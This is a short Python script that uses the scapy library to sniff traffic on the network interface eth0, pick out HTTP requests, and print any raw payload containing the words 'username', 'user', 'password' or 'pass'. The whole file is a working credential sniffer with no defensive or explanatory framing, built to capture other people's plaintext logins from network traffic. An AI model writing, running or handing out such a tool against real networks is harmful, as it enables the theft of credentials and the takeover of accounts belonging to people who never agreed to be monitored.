import scapy.all as sc
from scapy.layers import http

def sniffer(interface):
    sc.sniff(iface=interface, store=False, prn=sniffed_packet)

def sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(sc.Raw):
            data = packet[sc.Raw].load
            keywords = ["username", "user", "password", "pass"]
            for keyword in keywords:
                if keyword in data:
                    print(data)

sniffer("eth0")